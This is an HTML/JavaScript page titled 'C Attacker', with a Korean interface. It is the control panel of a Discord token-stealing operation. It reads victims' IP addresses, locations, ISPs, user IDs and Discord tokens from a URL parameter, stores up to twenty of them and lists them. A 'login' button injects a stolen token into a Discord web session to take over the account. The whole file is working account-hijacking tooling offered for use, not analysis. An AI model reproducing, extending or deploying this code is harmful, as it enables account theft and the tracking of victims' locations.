<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>C Attacker</title>
  <style>
    body { background: #0b0b12; color: #eee; font-family: monospace; padding: 20px; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { border: 1px solid #333; padding: 8px; text-align: left; word-break: break-all; }
    th { background: #1a1a2e; }
    .btn { padding: 4px 10px; border: none; border-radius: 4px; cursor: pointer; }
    .btn-login { background: #5865F2; color: #fff; }
    .btn-del { background: #e74c3c; color: #fff; }
    .empty { text-align: center; padding: 40px 0; color: #555; }
    .debug { background: #111; color: #0f0; padding: 10px; margin-top: 20px; border-radius: 4px; font-size: 12px; max-height: 200px; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>⚡ C Attacker</h1>
  <div>📡 수집된 로그: <span id="count">0</span> / 20</div>
  <button onclick="clearAll()">🗑 전체 삭제</button>
  <table>
    <thead><tr><th>#</th><th>IP</th><th>위치</th><th>통신사</th><th>유저 ID</th><th>토큰</th><th>액션</th></tr></thead>
    <tbody id="logBody"><tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr></tbody>
  </table>
  <div class="debug" id="debug">🚀 대시보드 로드됨</div>

  <script>
    const debug = document.getElementById('debug');
    function dlog(msg) { debug.textContent += '\n' + msg; console.log(msg); }

    let logs = JSON.parse(localStorage.getItem('attacker_logs')) || [];
    const MAX = 20;
    dlog('📂 저장된 로그: ' + logs.length + '개');

    function render() {
      const tbody = document.getElementById('logBody');
      document.getElementById('count').textContent = logs.length;
      if (logs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>`;
        return;
      }
      let html = '';
      logs.forEach((log, i) => {
        html += `
          <tr>
            <td>${i+1}</td>
            <td>${log.ip || 'IP 없음'}</td>
            <td>${log.city || ''} ${log.region || ''} ${log.country || ''}</td>
            <td>${log.isp || '알 수 없음'}</td>
            <td>${log.userId || '알 수 없음'}</td>
            <td style="font-size:12px;max-width:150px;overflow:hidden;">${log.token || '토큰 없음'}</td>
            <td>
              <button class="btn btn-login" onclick="login('${log.token}')">🔓 로그인</button>
              <button class="btn btn-del" onclick="del(${i})">✕</button>
            </td>
          </tr>
        `;
      });
      tbody.innerHTML = html;
    }

    function addLog(data) {
      dlog('📥 addLog 호출됨, 데이터: ' + JSON.stringify(data));
      if (!data) { dlog('❌ 데이터 없음'); return false; }
      if (logs.length >= MAX) { alert('최대 20명'); return false; }
      logs.push({
        ip: data.ip || 'IP 없음',
        city: data.city || '알 수 없음',
        region: data.region || '알 수 없음',
        country: data.country || '알 수 없음',
        isp: data.isp || '알 수 없음',
        lat: data.lat || '없음',
        lon: data.lon || '없음',
        token: data.token || '토큰 없음',
        userId: data.userId || '알 수 없음'
      });
      localStorage.setItem('attacker_logs', JSON.stringify(logs));
      render();
      dlog('✅ 저장 성공! 총 ' + logs.length + '개');
      alert('✅ 로그가 저장되었습니다!');
      return true;
    }

    function del(index) {
      if (!confirm('삭제?')) return;
      logs.splice(index, 1);
      localStorage.setItem('attacker_logs', JSON.stringify(logs));
      render();
      dlog('🗑️ 삭제됨, 현재 ' + logs.length + '개');
    }

    function clearAll() {
      if (!confirm('전체 삭제?')) return;
      logs = [];
      localStorage.setItem('attacker_logs', JSON.stringify(logs));
      render();
      dlog('🗑️ 전체 삭제됨');
    }

    function login(token) {
      if (!token || token === '토큰 없음') { alert('유효한 토큰 아님'); return; }
      const win = window.open('https://discord.com/app', '_blank');
      if (!win) { alert('팝업 차단 해제'); return; }
      setTimeout(() => {
        try { win.eval(`localStorage.setItem('token', JSON.stringify("${token}")); location.reload();`); }
        catch(e) { alert('로그인 실패'); }
      }, 1500);
      alert('✅ 로그인 시도 중');
    }

    (function init() {
      const params = new URLSearchParams(window.location.search);
      const logParam = params.get('log');
      dlog('🔍 log 파라미터: ' + (logParam || '없음'));
      if (logParam) {
        try {
          const decoded = decodeURIComponent(logParam);
          dlog('📥 디코딩: ' + decoded);
          const data = Object.fromEntries(new URLSearchParams(decoded));
          dlog('📦 파싱 데이터: ' + JSON.stringify(data));
          addLog(data);
          if (window.history && window.history.replaceState) {
            window.history.replaceState({}, document.title, window.location.pathname);
          }
        } catch(e) {
          dlog('❌ 오류: ' + e.message);
          alert('❌ 오류: ' + e.message);
        }
      }
      render();
      dlog('✅ 대시보드 로드 완료');
    })();
  </script>
</body>
</html>
